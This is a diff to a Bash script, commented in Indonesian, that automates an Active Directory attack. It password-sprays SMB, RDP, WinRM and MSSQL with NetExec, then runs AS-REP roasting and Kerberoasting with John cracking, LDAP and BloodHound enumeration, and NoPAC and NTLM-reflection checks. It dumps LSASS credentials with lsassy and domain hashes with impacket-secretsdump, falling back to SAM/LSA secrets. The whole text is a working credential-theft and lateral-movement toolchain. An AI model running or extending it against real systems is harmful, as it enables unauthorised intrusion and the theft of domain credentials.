@@ -83,7 +83,7 @@ get_domain() {
 
     local domain="" hostname="" nxc_out
     echo -e "${GRAY}[CMD] timeout 15s nxc smb \"$ip\" --no-progress${NC}" >&2
-    nxc_out=$(timeout 15s nxc smb "$ip" --no-progress 2>/dev/null)
+    nxc_out=$(timeout 30s nxc smb "$ip" --no-progress 2>/dev/null)
     domain=$(echo "$nxc_out" | grep -oP '(?<=domain:)[^ )]+' | head -n1)
     hostname=$(echo "$nxc_out" | grep -oP '(?<=\(name:)[^)]+' | head -n1)
 
@@ -108,7 +108,7 @@ process_target_proto() {
     local DOMAIN
     local SKIP_DOMAIN=""    
     DOMAIN=$(get_domain "$ip" 2>/dev/null | tail -n1)
-    
+
     # File temporary unik per thread/job
     local TMP_RES=".tmp_res_${ip}_${proto}_$$"
     local TMP_SUCCESS=".tmp_success_${ip}_${proto}_$$"
@@ -132,8 +132,8 @@ process_target_proto() {
 
 
     while [ $attempt_spray -le $max_spray ]; do
-        echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" $EXTRA --continue-on-success --no-progress${NC}"
-        timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
+        echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" $EXTRA --continue-on-success --no-progress${NC}"
+        timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
         sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
         cat "$TMP_RES" >> "$RAW_OUT"
         grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
@@ -154,8 +154,8 @@ process_target_proto() {
 
     # --- FALLBACK LOCAL AUTH ---
     if [[ ! -s "$TMP_SUCCESS" ]]; then
-        echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" --local-auth --continue-on-success --no-progress${NC}"
-        timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --local-auth --continue-on-success --no-progress > "$TMP_RES" 2>&1
+        echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" --local-auth --continue-on-success --no-progress${NC}"
+        timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --local-auth --continue-on-success --no-progress > "$TMP_RES" 2>&1
         sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
         cat "$TMP_RES" >> "$RAW_OUT"
         grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
@@ -163,8 +163,8 @@ process_target_proto() {
     if [[ ! -s "$TMP_SUCCESS" && -z "$SKIP_DOMAIN" && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
         local attempt_dom=1
         while [ $attempt_dom -le $max_spray ]; do
-            echo -e "${GRAY}[CMD] timeout 45s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
-            timeout 45s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
+            echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
+            timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
             sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
             cat "$TMP_RES" >> "$RAW_OUT"
             grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
@@ -225,8 +225,8 @@ process_target_proto() {
             if mkdir "$OUTDIR/lock_asrep_${DOMAIN}" 2>/dev/null; then
                 ASREP_HASH_FILE="$OUTDIR/asrep_${DOMAIN}.txt"
                 echo -e "${PURPLE}[EXEC] Running ASREP Roasting → $DOMAIN ($dc_ip)${NC}"
-                echo -e "${GRAY}[CMD] timeout 40s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
-                timeout 40s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"
+                echo -e "${GRAY}[CMD] timeout 100s impacket-GetNPUsers \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -format hashcat -outputfile \"$ASREP_HASH_FILE\"${NC}"
+                timeout 100s impacket-GetNPUsers "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -format hashcat -outputfile "$ASREP_HASH_FILE" 2>&1 | tee "$OUTDIR/asrep_${DOMAIN}_raw.log"
                 
                 if [[ -s "$ASREP_HASH_FILE" ]]; then
                     echo -e "${RED}[!] ASREP hash found! Cracking with John...${NC}"
@@ -243,8 +243,8 @@ process_target_proto() {
             if mkdir "$OUTDIR/lock_kerb_${DOMAIN}" 2>/dev/null; then
                 KERB_HASH_FILE="$OUTDIR/kerberoast_${DOMAIN}.txt"
                 echo -e "${PURPLE}[EXEC] Running Kerberoasting → $DOMAIN ($dc_ip)${NC}"
-                echo -e "${GRAY}[CMD] timeout 40s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
-                timeout 40s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"
+                echo -e "${GRAY}[CMD] timeout 100s impacket-GetUserSPNs \"$DOMAIN/$user:$pass\" -dc-ip \"$dc_ip\" -request -outputfile \"$KERB_HASH_FILE\"${NC}"
+                timeout 100s impacket-GetUserSPNs "$DOMAIN/$user:$pass" -dc-ip "$dc_ip" -request -outputfile "$KERB_HASH_FILE" 2>&1 | tee "$OUTDIR/kerberoast_${DOMAIN}_raw.log"
                 
                 if [[ -s "$KERB_HASH_FILE" ]]; then
                     echo -e "${RED}[!] Kerberoast hash found! Cracking with John...${NC}"
@@ -272,13 +272,13 @@ process_target_proto() {
             echo "[DEBUG] RAW USER: $user"
             echo "[DEBUG] FINAL LDAP_USER: $LDAP_USER"
             echo -e "${YELLOW}[!] Executing ldapdomaindump...${NC}"
-            echo "[CMD] timeout 60s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\""
-            timeout 60s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
+            echo "[CMD] timeout 100s ldapdomaindump \"$ip\" -u \"$LDAP_USER\" -p \"$pass\" -o \"$DUMP_PATH\""
+            timeout 100s ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" 
 
             if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                 echo -e "${YELLOW}[!] Exporting users via LDAP for domain $DOMAIN...${NC}"
-                echo -e "${GRAY}[CMD] timeout 40s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
-                timeout 40s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
+                echo -e "${GRAY}[CMD] timeout 100s nxc ldap \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
+                timeout 100s nxc ldap "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
                 if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                     cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                     rm -f "$USER_EXPORT_OUT.tmp"
@@ -289,10 +289,15 @@ process_target_proto() {
 
         # --- SMB POST-EXPLOIT ---
         if [[ "$proto" == "smb" ]]; then
+
+            ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
+
+            # --- USERS EXPORT (DOMAIN ONLY) ---
             if [[ "$DOMAIN" != "." ]] && mkdir "$OUTDIR/lock_userexp_${DOMAIN}" 2>/dev/null; then
                 echo -e "${YELLOW}[!] Exporting users via SMB for domain $DOMAIN...${NC}"
-                echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG --users-export \"$USER_EXPORT_OUT.tmp\"${NC}"
-                timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
+
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG --users-export "$USER_EXPORT_OUT.tmp" >/dev/null 2>&1
+
                 if [[ -s "$USER_EXPORT_OUT.tmp" ]]; then
                     cat "$USER_EXPORT_OUT.tmp" >> "$USER_EXPORT_OUT"
                     rm -f "$USER_EXPORT_OUT.tmp"
@@ -300,18 +305,54 @@ process_target_proto() {
                 fi
             fi
 
-            ABS_SPIDER=$(readlink -f "$SPIDER_DIR")
-            echo -e "${GRAY}[CMD] timeout 60s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M spider_plus ...${NC}"
-            timeout 60s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" >/dev/null 2>&1
-            
-            echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M nopac${NC}"
-            timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac > "$TMP_RES" 2>&1
-            grep -qi "VULNERABLE" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"; }
+            # ---------- SPIDER ----------
+            echo -e "${GRAY}[CMD] SMB spider_plus${NC}"
+            if [[ "$DOMAIN" != "." ]]; then
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
 
-            echo -e "${GRAY}[CMD] timeout 30s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $DOMAIN_ARG -M ntlm_reflection${NC}"
-            timeout 30s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection > "$TMP_RES" 2>&1
-            grep -qi "vulnerable" "$TMP_RES" && { echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"; echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"; }
+                if ! grep -qiE "success|accessible" "$TMP_RES"; then
+                    echo -e "${GRAY}[CMD] (fallback local) spider_plus${NC}"
+                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
+                fi
+            else
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER="$ABS_SPIDER" | tee "$TMP_RES"
+            fi
 
+            # ---------- NOPAC ----------
+            echo -e "${GRAY}[CMD] SMB nopac${NC}"
+            if [[ "$DOMAIN" != "." ]]; then
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M nopac | tee "$TMP_RES"
+
+                if ! grep -qi "VULNERABLE" "$TMP_RES"; then
+                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
+                fi
+            else
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M nopac | tee "$TMP_RES"
+            fi
+
+            grep -qi "VULNERABLE" "$TMP_RES" && {
+                echo -e "${RED}[!] ALERT: Target VULNERABLE to NoPAC!${NC}"
+                echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NoPAC!" >> "$CLEAN_OUT"
+            }
+
+            # ---------- NTLM REFLECTION ----------
+            echo -e "${GRAY}[CMD] SMB ntlm_reflection${NC}"
+            if [[ "$DOMAIN" != "." ]]; then
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M ntlm_reflection | tee "$TMP_RES"
+
+                if ! grep -qi "vulnerable" "$TMP_RES"; then
+                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
+                fi
+            else
+                timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M ntlm_reflection | tee "$TMP_RES"
+            fi
+
+            grep -qi "vulnerable" "$TMP_RES" && {
+                echo -e "${RED}[!] ALERT: Target VULNERABLE to NTLM Reflection!${NC}"
+                echo "[$proto] $ip - [!!!] ALERT: VULNERABLE to NTLM Reflection!" >> "$CLEAN_OUT"
+            }
+
+            # ---------- BLOODHOUND (DOMAIN ONLY) ----------
             if [[ -z "${BH_DONE[$DOMAIN]}" && "$DOMAIN" != "." ]]; then
                 if mkdir "$OUTDIR/lock_bh_${DOMAIN}" 2>/dev/null; then
                     BH_DIR="$OUTDIR/bloodhound_${ip}"
@@ -319,17 +360,33 @@ process_target_proto() {
                     echo -e "${YELLOW}[*] Ingesting AD data via BloodHound...${NC}"
                     (
                         cd "$BH_DIR" || exit
-                        echo -e "${GRAY}[CMD] timeout 150s bloodhound-python -d \"$DOMAIN\" -dc \"${DC_FQDN_MAP[$DOMAIN]}\" -u \"$user\" -p \"$pass\" -ns \"$dc_ip\" -c all${NC}"
                         timeout 150s bloodhound-python -d "$DOMAIN" -dc "${DC_FQDN_MAP[$DOMAIN]}" -u "$user" -p "$pass" -ns "$dc_ip" -c all >bloodhound_run.log 2>&1
                     )
                 fi
             fi
 
+            # ---------- LSASSY ----------
             if echo "$BEST_LINE" | grep -qi "Pwn3d!"; then
-                echo -e "${GRAY}[CMD] timeout 40s nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy${NC}"
-                timeout 40s nxc smb "$ip" -u "$user" -p "$pass" $EXTRA $DOMAIN_ARG -M lsassy > "$TMP_RES" 2>&1
+                echo -e "${GRAY}[CMD] SMB lsassy${NC}"
+
+                if [[ "$DOMAIN" != "." ]]; then
+                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" $DOMAIN_ARG -M lsassy | tee "$TMP_RES"
+
+                    if ! grep -qiE "dumped|success" "$TMP_RES"; then
+                        echo -e "${GRAY}[CMD] (fallback local) lsassy${NC}"
+                        timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
+                    fi
+                else
+                    timeout 100s nxc smb "$ip" -u "$user" -p "$pass" --local-auth -M lsassy | tee "$TMP_RES"
+                fi
+
+                LSASS_OUT="$OUTDIR/lsassy_${ip}.txt"
+
                 if grep -qiE "dumped|success" "$TMP_RES"; then
                     echo "[$proto] $ip - [LSASS] Credentials successfully dumped via lsassy" >> "$CLEAN_OUT"
+                    
+                    # simpan hasil lsassy
+                    cat "$TMP_RES" >> "$LSASS_OUT"
                 fi
             fi
         fi
@@ -469,43 +526,67 @@ if [[ -s "$FINAL_CREDS_FILE" ]]; then
         
         DOMAIN=$(get_domain "$ip")
         [[ "$DOMAIN" == "." ]] && DOMAIN="WORKGROUP"
-        
-        echo -e "${YELLOW}[*] Attempting NTDS.dit dump on $ip using $cred_user...${NC}"
-        
+
+        echo -e "${YELLOW}[*] Attempting secretsdump on $ip using $cred_user...${NC}"
+
         dump_out_name="$OUTDIR/secretsdump_${DOMAIN}_${ip}_${cred_user}"
-        
-        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$DOMAIN/$cred_user:$cred_pass@$ip\" -outputfile \"$dump_out_name\"${NC}"
-        echo -e "${BLUE}--- SECRETSDUMP LIVE OUTPUT ---${NC}"
-        
-        # Eksekusi live dengan tee
-        timeout 120s impacket-secretsdump -just-dc "$DOMAIN/$cred_user:$cred_pass@$ip" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
-        
-        echo -e "${BLUE}-------------------------------${NC}"
-        
-        # -----------------------------------------------------------
-        # Validasi Keberhasilan Dump secara Akurat
-        # -----------------------------------------------------------
-        # Impacket menghasilkan file dengan akhiran .ntds. 
-        # Kita cek apakah file ada, tidak kosong, DAN mengandung struktur hash NTLM (seperti :::)
-        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
-            echo -e "${GREEN}[+++] SUCCESS! Domain hashes dumped successfully from $ip${NC}"
-            echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
-            
-            # Catat IP ini ke tracker agar tidak di-dump ulang oleh user lain
-            echo "$ip" >> "$DUMPED_IPS_TRACKER"
+
+        # --- BUILD TARGET STRING (DOMAIN / LOCAL SAFE) ---
+        if [[ "$DOMAIN" == "." ]]; then
+            TARGET_STRING="$cred_user:$cred_pass@$ip"
         else
-            echo -e "${RED}[-] Failed to dump NTDS from $ip using $cred_user (Access Denied / DRSUAPI Error)${NC}"
-            echo -e "${GRAY}[DEBUG] Full log history saved in $OUTDIR/secretsdump_run.log${NC}"
-            
-            # Membersihkan file sampah/kosong hasil generate impacket yang gagal
-            rm -f "${dump_out_name}.ntds" "${dump_out_name}.sam" "${dump_out_name}.secrets" 2>/dev/null
+            TARGET_STRING="$DOMAIN/$cred_user:$cred_pass@$ip"
         fi
+
+        # --- STEP 1: JUST-DC ---
+        echo -e "${GRAY}[CMD] timeout 120s impacket-secretsdump -just-dc \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
+        echo -e "${BLUE}--- SECRETSDUMP JUST-DC OUTPUT ---${NC}"
+
+        timeout 120s impacket-secretsdump -just-dc "$TARGET_STRING" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
+
+        echo -e "${BLUE}----------------------------------${NC}"
+
+        # --- CHECK NTDS SUCCESS ---
+        if [[ -s "${dump_out_name}.ntds" ]] && grep -q ":::" "${dump_out_name}.ntds"; then
+            echo -e "${GREEN}[+++] SUCCESS! NTDS.dit dumped from $ip${NC}"
+            echo -e "${GREEN}[+] Output saved to: ${dump_out_name}.ntds${NC}"
+
+            echo "$ip" >> "$DUMPED_IPS_TRACKER"
+
+        else
+            echo -e "${YELLOW}[!] JUST-DC failed, trying full secretsdump...${NC}"
+
+            # --- STEP 2: FULL DUMP ---
+            echo -e "${GRAY}[CMD] timeout 180s impacket-secretsdump \"$TARGET_STRING\" -outputfile \"$dump_out_name\"${NC}"
+            echo -e "${BLUE}--- SECRETSDUMP FULL OUTPUT ---${NC}"
+
+            timeout 180s impacket-secretsdump "$TARGET_STRING" -outputfile "$dump_out_name" 2>&1 | tee -a "$OUTDIR/secretsdump_run.log"
+
+            echo -e "${BLUE}--------------------------------${NC}"
+
+            # --- CHECK LOCAL DUMP SUCCESS ---
+            if [[ -s "${dump_out_name}.sam" || -s "${dump_out_name}.secrets" ]]; then
+                echo -e "${GREEN}[+++] SUCCESS! SAM/LSA secrets dumped from $ip${NC}"
+                echo -e "${GREEN}[+] Output files: ${dump_out_name}.sam / .secrets${NC}"
+
+                echo "$ip" >> "$DUMPED_IPS_TRACKER"
+
+            else
+                echo -e "${RED}[-] Failed to dump any secrets from $ip using $cred_user${NC}"
+                echo -e "${GRAY}[DEBUG] Check $OUTDIR/secretsdump_run.log${NC}"
+
+                # cleanup kalau gagal
+                rm -f "${dump_out_name}.ntds" "${dump_out_name}.sam" "${dump_out_name}.secrets" 2>/dev/null
+            fi
+        fi
+
         echo "------------------------------------------------------------"
+
+            
+        done < "$FINAL_CREDS_FILE"
         
-    done < "$FINAL_CREDS_FILE"
-    
-    # Hapus file tracker setelah selesai phase 5
-    rm -f "$DUMPED_IPS_TRACKER"
+        # Hapus file tracker setelah selesai phase 5
+        rm -f "$DUMPED_IPS_TRACKER"
 fi
 
 if [[ -s "$BROKEN_PIPE_LOG" ]]; then
